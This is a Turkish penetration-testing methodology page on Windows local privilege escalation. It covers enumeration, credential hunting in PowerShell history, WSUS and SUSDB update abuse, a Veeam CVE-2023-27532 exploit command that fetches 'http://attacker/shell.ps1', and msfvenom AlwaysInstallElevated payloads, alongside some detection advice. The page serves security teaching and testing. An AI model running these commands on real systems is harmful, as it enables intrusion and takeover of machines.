# Windows Yerel Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfada, birkaç temel rehberdeki genel Windows yetki yükseltme metodolojisi bir araya getirilmiştir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Pratik enumeration akışında ayrıca topluluk atölyelerinden ve kontrol listelerinden yararlanılmıştır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Geçmişteki saldırı materyalleri arasında Windows yetki yükseltme konulu DerbyCon sunumu da yer alır.<sup>[[5]](#references)</sup>

## İlk Windows Kuramı

### Access Tokens

**Windows access token'larının ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfaya bakın:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'ta integrity level'ların ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Denetimleri

Windows'ta **sistemi enumerate etmenizi**, yürütülebilir dosyaları çalıştırmanızı ve hatta **etkinliklerinizin tespit edilmesini** **engelleyebilecek** çeşitli unsurlar vardır. Yetki yükseltme enumeration'ına başlamadan önce aşağıdaki **sayfayı** **okumalı** ve bu **savunma mekanizmalarının** tümünü **enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fiziksel erişim, çevrimdışı bir UEFI NVRAM düzenlemesini önyükleme öncesi DMA'ya ve Windows `SYSTEM` belleğine yama uygulama zincirine dönüştürebilir:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess sessiz yükseltme

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess süreçleri, AppInfo'nun güvenli yol kontrolleri atlatıldığında istem olmadan High IL'ye ulaşmak için kötüye kullanılabilir. Özel UIAccess/Admin Protection atlatma iş akışına buradan bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop erişilebilirlik kayıt defteri yayılımı, keyfi bir SYSTEM kayıt defteri yazma işlemi (RegPwn) için kötüye kullanılabilir:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Yeni Windows derlemelerinde ayrıca ayrıcalıklı yerel NTLM kimlik doğrulamasının yeniden kullanılan bir SMB TCP bağlantısı üzerinden yansıtıldığı **SMB keyfi bağlantı noktası** LPE yolu da kullanıma sunulmuştur:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

### Sürüm bilgilerini enumerate etme

Windows sürümünde bilinen bir güvenlik açığı olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Sürüm Exploit'leri

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunur ve Windows ortamının sunduğu **geniş saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — işletim sistemi derlemesini, yüklü güncellemeleri ve uygun olabilecek bazı güvenlik duyurularını listeler; bir sonucun geçerli olduğunu varsaymadan önce tam ürünü ve yerine geçen güncellemeleri doğrulayın.

Sürüme özgü bir yerel exploit için işletim sistemi mimarisinin yanı sıra **çalışan işlemin mimarisini** de kontrol edin. 64 bit Windows'ta 32 bit bir işlem [WOW64 dosya sistemi yönlendirmesine](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) tabidir: `%windir%\System32` genellikle 32 bit sistem dizinine karşılık gelirken `%windir%\Sysnative`, işlemin yerel sistem dizinine erişmesini sağlar. Bu takma ad 64 bit bir işlem tarafından kullanılamaz. İşletim sistemi derlemesi veya eksik KB adayı, sistemin exploitable olduğunu kanıtlamaz; çalışan derlemeyi, yüklü olan veya onun yerine geçen güncellemeyi, işlem mimarisini ve exploit ön koşullarını söz konusu sorunla ilgili [Microsoft güvenlik bülteniyle](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) karşılaştırın.

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit GitHub depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kayıtlı herhangi bir kimlik bilgisi/Juicy bilgi var mı?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell Geçmişi

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transkript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` yalnızca bir örnektir. [PowerShell transkripsiyon ilkesi](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalde her kullanıcının Documents klasörüne yazar; ancak `OutputDirectory` ayarı veya `Start-Transcript -OutputDirectory`, dosyaları paylaşılan ya da gizli bir klasöre yönlendirebilir. Bir transkripti incelemeden önce etkin çıktı yolunu ve dosya ACL'sini kontrol edin: transkript, kimlik bilgileri de dâhil olmak üzere komut bağımsız değişkenlerini ve çıktısını içerebilir. Okunabilir bir transkript, yalnızca içeriği kullanılabilir bir üst düzey ayrıcalıklı kimliği açığa çıkarıyorsa ve bu kimlikle ilgili bağlamda oturum açılabiliyorsa bir ipucudur.

### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; yürütülen komutlar, komut çağrıları ve betiklerin bazı bölümleri buna dâhildir. Ancak yürütmenin tüm ayrıntıları ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için belgelerin "Transkript dosyaları" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini tercih edin.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShell günlüklerinden son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Betik yürütülürken her kod bloğunun belgelenmesini sağlayan, etkinliklerin ve betiğin yürütülme içeriğinin eksiksiz bir kaydı tutulur. Bu süreç, her etkinliğin kapsamlı bir denetim izini korur; bu iz, adli incelemeler ve kötü amaçlı davranışların analizi için değerlidir. Yürütme sırasında tüm etkinlikler belgelenerek süreç hakkında ayrıntılı bilgiler sunulur.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block için günlük olayları, Windows Olay Görüntüleyicisi'nde şu yolda bulunabilir: **Uygulama ve Hizmet Günlükleri > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### İnternet Ayarları

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Sürücüler

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Bir HTTP WSUS uç noktası, güncelleme meta verilerinin ele geçirilmesini araştırmak için bir ipucudur. İstismar, istemcinin söz konusu WSUS sunucusunu kullanıp kullanmadığına, saldırganın trafiği ele geçirip geçiremeyeceğine veya kontrol edip edemeyeceğine ve istemcinin güncellemelere yönelik güven ve yükleme ilkesine de bağlıdır. URL tek başına kod yürütüldüğünü göstermez. [Microsoft, WSUS meta verileri için TLS kullanılmasını önerir](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ağda SSL kullanmayan bir WSUS güncellemesi olup olmadığını kontrol etmek için cmd'de aşağıdaki komutu çalıştırarak başlayın:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ya da PowerShell'de aşağıdakini kullanın:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Şunlardan biri gibi bir yanıt alırsanız:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

`UseWUServer` değeri `1` olduğunda Windows Update, yapılandırılmış intranet hizmetini kullanır. Bu, HTTP interception yolu için bir ön koşulun sağlandığını doğrular; ancak interception işleminin, kötü amaçlı güncellemelerin kabul edilmesinin veya yükseltilmiş ayrıcalıklarla kurulumun mümkün olduğunu kanıtlamaz. Değer `0` olduğunda, bu politika kapsamında yapılandırılmış WSUS endpoint'i seçilmez.

Bu güvenlik açıklarını exploit etmek için [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) gibi araçları kullanabilirsiniz. Bunlar, SSL kullanılmayan WSUS trafiğine 'fake' güncellemeler enjekte etmek için hazırlanmış MiTM exploit script'leridir.

Araştırmayı buradan okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak, bu bug'ın exploit ettiği açıklık şudur:

> Yerel kullanıcı proxy'mizi değiştirme yetkimiz varsa ve Windows Updates, Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, kendi trafiğimizi yakalamak ve varlığımızda yükseltilmiş bir kullanıcı olarak kod çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus)'u yerel olarak çalıştırabiliriz.
>
> Ayrıca, WSUS hizmeti mevcut kullanıcının ayarlarını kullandığından, kullanıcının sertifika deposunu da kullanır. WSUS hostname'i için self-signed bir sertifika oluşturup bu sertifikayı mevcut kullanıcının sertifika deposuna eklersek hem HTTP hem de HTTPS WSUS trafiğini yakalayabiliriz. WSUS, sertifika üzerinde trust-on-first-use türünde bir doğrulama uygulamak için HSTS benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir bulunuyor ve doğru hostname'e sahipse hizmet tarafından kabul edilir.

Bu güvenlik açığını [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla exploit edebilirsiniz (yayınlandıktan sonra).

### WSUS yöneticisinin kontrolündeki güncellemeler

Mevcut kimliğin bir WSUS sunucusunda güncellemeleri **yayımlayıp onaylayabildiği** durumlarda ayrı bir yol vardır. Sunucunun `WSUS Administrators` grubundaki etkin üyeliği ve devredilmiş WSUS izinlerini kontrol edin, ardından onaylanan güncellemeyi alacak istemci bilgisayar grubunu belirleyin. [Microsoft, güncellemeleri onaylamak için WSUS Administrator ayrıcalıkları gerektiğini belirtir](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) ve [yayımlama güven ilişkisini belgeler](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): istemciler, yerel olarak yayımlanan içerik için kullanılan imzalama sertifikasına güvenmelidir. Bu yolu bir privilege escalation yöntemi olarak değerlendirmeden önce aday güncellemenin imzalandığını ve kabul edildiğini, hedef için geçerli olduğunu ve daha ayrıcalıklı bir bağlamda kurulduğunu doğrulayın. Tek başına HTTP `WUServer` değeri veya grup adı bu koşulların sağlandığını göstermez.

### SUSDB özel güncelleme istismarı: `.txt`/`.esd` üzerinden imzasız payload'lar

Bu, HTTP WSUS bağlantısını yakalamaktan farklı bir güven sınırı ihlalidir: ön koşul, özel bir güncellemeyi yayımlamak ve onaylamak için **WSUS veritabanındaki (`SUSDB`) stored procedure'lere** yeterli erişime sahip olmaktır. Pratik bir ilk erişim yolu, bir upstream WSUS bilgisayar hesabının `SUSDB` barındıran ayrı bir MSSQL sunucusuna relay edilmesidir; tam ön koşul dağıtıma bağlıdır, bu nedenle SQL administrator yetkilerinin olduğunu varsaymak yerine önce `EXECUTE` izinlerini listeleyin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS istemci kimlik doğrulamasını HTTP/8530'dan LDAP, SMB veya AD CS'ye relay eden ayrı saldırı yolu için bkz. [NTLM relay için WSUS HTTP'yi kötüye kullanma](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Harici veritabanı relay'ini ve procedure izinlerini doğrulama

WSUS'un harici bir SQL Server kullandığı dağıtımlarda, önce WSUS sunucu hesabının veritabanında kimlik doğrulaması yapıp yapamadığını ve NTLM relay'in bu dinleyiciye ulaşıp ulaşmadığını kontrol edin. Doğrudan tablo yazma işlemleri reddedilse bile sunucunun SQL rolü, güncelleme yayımlama procedure'lerini kullanıma açabilir; `SUSDB` üzerinde başarısız olan bir `UPDATE` işlemi, güncelleme yayımlama yetkisinin engellendiğini göstermez. Özel bir güncelleme denemeden önce yetkili bir SQL oturumunda etkin kimliği, rol üyeliğini ve procedure izinlerini inceleyin.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Canlı prosedür tanımları ve yüklü `SoftwareDistributionPackage.xsd`, geçerli güncelleme meta verilerini yeniden oluştururken faydalıdır. Bundle üst öğesi ve payload alt öğesinin her biri `UpdateIdentity` (fragment type `1`), `LocalizedProperties` (`4`) ve `ExtendedProperties` (`2`) gerektirir; her `spImportUpdate` çağrısının döndürdüğü yerel revision ID'yi alın ve bundle ilişkisini, digest'leri, boyutu, content URL'yi ve revision'ı tutarlı tutun. Bu, duruma bağlı bir yayımlama iş akışıdır; bu nedenle başarılı tek bir saklı yordam çağrısı, istemci tarafında yürütmenin kanıtı değildir.<sup>[[38]](#references)</sup>

#### Güncellemeyi oluşturma, hedefleme ve onaylama

Özel güncelleme iş akışı, kısıtlı bir yayımlama API'si olarak meşru WSUS prosedürlerini kullanır. Önemli durum geçişleri şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili saklı yordamlar |
| --- | --- |
| Güncelleme meta verilerini içe aktarma | `spImportUpdate` |
| Önkoşul, yerelleştirilmiş ve genişletilmiş XML fragment'lerini kaydetme | `spSaveXMLFragment` |
| İçerik digest'ini saldırganın kontrolündeki URL ile ilişkilendirme | `spSetBatchURL` |
| Bir bilgisayar grubunu listeleme/oluşturma ve istemciyi gruba ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Bu grup için kurulumu onaylama | `@actionID = 0` ve `@isAssigned = 1` ile `spDeployUpdate` |

Dosya adı, digest'ler, boyut ve `CommandLineInstallation` handler'ı, içe aktarılan meta veriler/fragment'ler arasında tutarlı olmalıdır. Content URL'yi ve hedef grubunu atadıktan sonra, son onay aşağıdakine benzer; örnek GUID'leri yeniden kullanmak yerine yeni güncelleme, grup ve dağıtım tanımlayıcıları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS normalde rastgele imzasız yürütülebilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` dosyasındaki .NET `VerifyFile` yolu, verilen dosya adı `.txt` veya `.esd` ile bitiyorsa sertifika denetimi bayrağını false olarak ayarlar; böylece baytların metin veya geçerli bir ESD görüntüsü olduğu önceden doğrulanmadan `CheckCertificateSignature` atlanır. Bu nedenle örneğin `payload.exe.txt` adı verilen, değiştirilmemiş bir PE içerik doğrulamasından geçebilir ve daha sonra güncellemenin komut satırı yükleme işleyicisi tarafından başlatılabilir. Bu, imza sahteciliği değil, bir politika/tür karışıklığı hatasıdır.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS uyumlu staging ve otomasyon

`spDeployUpdate` çağrıldığında WSUS, kaydedilen içeriği getirir. Kaynağın BITS'in HTTP beklentilerini karşılaması gerekir: erişilebilir bir URL tek başına yeterli değildir; aktarım, ilk `HEAD`/`GET` akışını ve byte-range isteklerini kullanır. Range desteği olmayan bir sunucu, BITS'in Range protokolü başlığını gerektirdiğini belirten WSUS eşitleme `EventId=364` hatasına neden olur.<sup>[[39]](#references)</sup>

Araştırma PoC'si [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment zinciri için gereken SQL'i oluşturur, bu SQL'i çalıştırmak için değiştirilmiş bir MSSQL client içerir ve içerik staging'i için `BitsWebServer.py` dosyasını sunar. Yetkili bir lab'de kullanılabilecek minimal bir komut şöyledir:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Gözetimsiz yürütme ve yeniden deneme yoluyla kalıcılık

İstemci tarafındaki etkileşim ilkelere bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` içindeki `4 - Auto download and schedule install` seçeneği, onaylanmış bir güncellemenin kullanıcı tarafından elle seçilmeden indirilip yapılandırılmış zamanlamaya göre yüklenmesini sağlar. Testlerde, güncellemesi başarısız/tamamlanmamış durumda kalan bir payload, callback süreci sona erdikten hemen sonra yeniden sunuldu; dolayısıyla yeniden deneme davranışı tekrarlanan yürütme yoluyla kalıcılık sağlayabilir. İstemci güncelleme başarısız durumunu gösterdiğinden bu yöntem gürültülüdür.<sup>[[39]](#references)</sup>

#### Tespit ve güçlendirme adımları

Bu zincire yönelik sunucu ve istemci tarafındaki yararlı inceleme adımları şunlardır:<sup>[[39]](#references)</sup>

- `SUSDB` üzerinde `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` yürütmelerini denetleyin; yeni hedefleme gruplarını, harici içerik kaynaklarını, `.txt`/`.esd` güncelleme payload’larını ve beklenmeyen sorumlular (özellikle bilgisayar hesabı olmayan hesaplar) tarafından yapılan dağıtımları inceleyin.
- `C:\Program Files\Update Services\LogFiles` içinde `ContentSyncAgent`, `FileVerified`, yanlış yazılmış `FileVerficationFailed` ve `EventId=364` kayıtlarını inceleyin; doğrulama işlemini uzantı ve içerik imzasıyla karşılaştırın, uzantıya güvenmeyin.
- Windows Update yüklemesinin tekrar tekrar başarısız olup yeniden denenmesini ve `.txt` ya da `.esd` adları taşıyan içeriklerden kaynaklanan PE yürütmelerini veya beklenmeyen alt süreç/ağ etkinliklerini araştırın.
- Desteklendiği yerlerde veritabanı hizmeti için Authentication üzerinde Extended Protection'ı zorunlu kılın ve veritabanı ağ erişimini WSUS sunucusu ile yetkili yönetim sistemleriyle sınırlayın. Özel güncelleme yordamlarındaki `EXECUTE` haklarını en aza indirin ve denetleyin.

## Üçüncü Taraf Otomatik Güncelleyiciler ve Agent IPC (yerel privesc)

Birçok kurumsal agent, localhost IPC yüzeyi ve ayrıcalıklı bir güncelleme kanalı sunar. Kayıt işlemi saldırganın sunucusuna yönlendirilebiliyorsa ve güncelleyici sahte bir root CA'ya ya da zayıf imzalayan denetimlerine güveniyorsa, yerel bir kullanıcı kötü amaçlı bir MSI iletebilir ve SYSTEM hizmeti bunu yükleyebilir. Genelleştirilmiş bir teknik için (Netskope stAgentSvc zincirini temel alır – CVE-2025-0309) buraya bakın:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Veeam Backup & Replication ve Cloud Connect, varsayılan olarak **TCP/9401** üzerinde bir temel yedekleme hizmeti kullanır. [Veeam'in güvenlik duyurusu](https://www.veeam.com/kb4424), yedekleme ağı sınırları içinde şifrelenmiş yapılandırma veritabanı kimlik bilgilerinin kimlik doğrulamasız ifşa edildiğini açıklar; ayrıca yayımlanmış ayrı bir PoC, **NT AUTHORITY\SYSTEM** olarak komut yürütme yolunu gösterir.<sup>[[12]](#references)</sup> Hizmet localhost dışındaki adreslere de bağlanabilir; bu nedenle gerçek adresini ve PID'sini kontrol edin.

- **Keşif**: TCP/9401'in `Veeam.Backup.Service.exe` sürecine ait olduğunu doğrulayın, ardından yüklü ürünü ve yama üstverilerini inceleyin. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ipucu niteliğindedir; eksiksiz bir yama denetimi değildir.
- **Düzeltilmiş en düşük sürümler**: Veeam, düzeltilmiş ilk sürümler olarak **11a build 11.0.1.1261 P20230227** ve **12 build 12.0.0.1420 P20230223** sürümlerini listeler; daha eski sürümler etkilenir. Dört parçalı bir dosya sürümü, yama uygulanmamış temel derlemeyi aynı derleme numaralarındaki daha sonraki bir yamadan tek başına ayırt edemez. Bir sınır derlemesini düzeltilmiş olarak nitelendirmeden önce yama tanımlayıcısını [üretici derleme geçmişiyle](https://www.veeam.com/kb2680) doğrulayın.
- **Exploit**: `VeeamHax.exe` gibi bir PoC'yi gerekli Veeam DLL'leriyle aynı dizine yerleştirin, ardından yerel soket üzerinden bir SYSTEM payload'ı tetikleyin:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Atıfta bulunulan PoC, ek ön koşullar sağlandığında SYSTEM olarak komut çalıştırılabildiğini gösterir; üreticinin güvenlik duyurusu kimlik bilgilerinin ifşa edilmesi sorununu açıklar.
## KrbRelayUp

Yerel bir Kerberos relay, uygun bir COM server kimlik doğrulaması yaptığında ve relay edilen principal hedef nesne üzerinde yetkilere sahip olduğunda, düşük yetkili bir oturum açma bağlamından ayrıcalıklı bir dizin yazma işlemine geçiş sağlayabilir. [KrbRelay belgeleri](https://github.com/cube0x0/KrbRelay) hem RBCD hem de `msDS-KeyCredentialLink` (shadow-credential) LDAP yazma işlemlerini belgeler; KrbRelayUp bu yollardan bazılarını otomatikleştirir. Bir RBCD zinciri, geçerli delegation ve hedef nesne üzerinde yetki gerektirirken, bir shadow-credential zinciri key-credential yazma yetkileri ve sertifika kimlik doğrulama yolunu destekleyen bir KDC gerektirir. Bu yollardan hiçbiri yalnızca etki alanı üyeliğiyle mümkün olmaz.

Gerçek DC'nin [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) ve [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) ilkelerini, relay edilen kimliğin nesne ACL'sini ve seçilen COM sınıfının kimlik doğrulama ve impersonation düzeylerini kontrol edin. Çağıranın oturum açma türü ve kimlik bilgisi bağlamı önemlidir: WinRM oturumu, etkileşimli oturumdan veya yeni kimlik bilgileriyle açılan oturumdan farklı davranabilir. Güvenlik duvarı/OXID yönlendirmesi ve yüklü güncellemeler de sonucu değiştirebilir. İzin verici bir ilkeyi veya eşleşen bir ACL'yi inceleme adayı olarak değerlendirin; pasif numaralandırma COM coercion, relay kimlik doğrulaması veya dizine yazma işlemlerini tetiklememelidir. Bir machine-account shadow credential, makine bileti alınmasını sağlayabilir ve yalnızca bu hesap gerekli dizin çoğaltma yetkilerine sahipse ayrı bir DCSync yoluna imkân verebilir.

**exploit'i şurada bulun:** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> adresini inceleyin.

## AlwaysInstallElevated

Bu 2 kayıt defteri ayarı **etkinse** (değer **0x1** ise), herhangi bir ayrıcalık düzeyindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Bir meterpreter session'ınız varsa, bu technique'i **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Geçerli dizinde privilege escalation için bir Windows MSI binary'si oluşturmak üzere power-up'tan `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup eklemek için bir istem gösteren önceden derlenmiş bir MSI installer dosyası oluşturur (bu nedenle GIU erişimine ihtiyacınız olacaktır):

```
Write-UserAddMSI
```

